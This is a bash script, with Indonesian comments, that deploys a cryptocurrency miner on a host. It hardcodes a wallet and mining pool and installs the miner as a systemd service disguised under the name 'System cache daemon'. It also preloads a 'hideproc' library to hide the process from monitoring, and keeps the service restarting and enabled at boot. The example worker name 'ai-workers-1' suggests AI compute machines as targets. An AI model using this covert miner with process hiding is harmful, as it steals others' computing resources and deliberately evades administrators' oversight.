#!/usr/bin/env bash
# sandbox-deploy.sh WORKER — pasang miner CONN + hideproc + unit systemd.
#
#   ./sandbox-deploy.sh ai-workers-1
#
# File yang harus ada di direktori yang sama:
#   xcb                 (cmake --build build -j)
#   librandomx_v2.so    (ikut build; RPATH $ORIGIN)
#   hideproc.so         (make -C labs/process-hide)
#
# Env override: WALLET, POOL, THREADS, HUGEPAGES.
set -euo pipefail
W="${1:?usage: sandbox-deploy.sh WORKER}"
SUDO=""; [ "$(id -u)" = 0 ] || SUDO="sudo"
DIR="$(cd "$(dirname "$0")" && pwd)"

WALLET="${WALLET:-cc1p2mf0hyvm86vglrx6j3sq0hcxn7y8k2lt2fu8fzguv825j6epskxqtx8cmn}"
POOL="${POOL:-eu.rplant.xyz:17194}"
THREADS="${THREADS:-4}"
HUGEPAGES="${HUGEPAGES:-1200}"

for f in xcb librandomx_v2.so hideproc.so; do
    [ -f "$DIR/$f" ] || { echo "file $f tidak ada di $DIR"; exit 1; }
done

$SUDO install -m 755 "$DIR/xcb" /usr/local/bin/xcb
$SUDO install -m 644 "$DIR/librandomx_v2.so" /usr/local/bin/librandomx_v2.so
$SUDO install -m 644 "$DIR/hideproc.so" /usr/local/lib/hideproc.so

$SUDO tee /etc/systemd/system/syscache-hugepages.service >/dev/null <<UNIT
[Unit]
Description=Hugepages for RandomX V2 dataset (CONN)
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/usr/sbin/sysctl -w vm.nr_hugepages=${HUGEPAGES} vm.max_map_count=262144
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNIT

$SUDO tee /etc/systemd/system/syscached.service >/dev/null <<UNIT
[Unit]
Description=System cache daemon
After=network-online.target syscache-hugepages.service
Wants=network-online.target syscache-hugepages.service

[Service]
Type=simple
ExecStart=/usr/local/bin/xcb -a conn --conn-pool ${POOL} -u ${WALLET} --worker ${W} -t ${THREADS} --ui=log
Restart=always
RestartSec=10
LimitMEMLOCK=infinity
NoNewPrivileges=true
Environment=LD_PRELOAD=/usr/local/lib/hideproc.so

[Install]
WantedBy=multi-user.target
UNIT

$SUDO systemctl daemon-reload
$SUDO systemctl enable --now syscache-hugepages.service syscached.service
sleep 8

echo "== cek library =="
if ! ldd /usr/local/bin/xcb | grep -q 'librandomx_v2.so =>'; then
    echo "FATAL: librandomx_v2.so tidak ter-resolve oleh /usr/local/bin/xcb"
    exit 1
fi

echo "svc=$(systemctl is-active syscached.service) hp=$(awk "/HugePages_Total/{print \$2}" /proc/meminfo)"
$SUDO journalctl -u syscached -n 8 --no-pager -o cat | tail -8
